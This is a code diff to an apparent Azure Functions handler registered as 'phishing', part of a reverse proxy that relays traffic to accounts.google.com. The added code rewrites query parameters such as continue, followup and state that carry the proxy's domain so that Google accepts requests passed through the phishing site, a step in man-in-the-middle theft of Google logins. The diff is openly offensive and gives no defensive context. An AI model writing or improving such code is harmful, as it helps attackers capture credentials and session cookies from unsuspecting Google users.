@@ -65,6 +65,26 @@ app.http("phishing", {
     upstream_url.port = 443;
     upstream_url.protocol = "https:";
 
+    // Sanitize query string — rewrite params like continue, followup, state
+    // that contain our proxy domain back to accounts.google.com so Google
+    // doesn't reject them with 400 Bad Request
+    const sanitizeParams = ["continue", "followup", "state", "service", "dsh", "flowName", "cid"];
+    let modifiedSearch = false;
+    for (const [key, value] of upstream_url.searchParams.entries()) {
+      if (sanitizeParams.includes(key) && value.includes(original_url.host)) {
+        const decoded = decodeURIComponent(value);
+        const fixed = decoded.replace(
+          new RegExp("https?://" + original_url.host.replace(/\./g, "\\."), "g"),
+          "https://" + upstream
+        );
+        upstream_url.searchParams.set(key, fixed);
+        modifiedSearch = true;
+      }
+    }
+    if (modifiedSearch) {
+      context.log("Sanitized query params for upstream compatibility");
+    }
+
     if (upstream_url.pathname === "/") {
       upstream_url.pathname = upstream_path;
     } else {
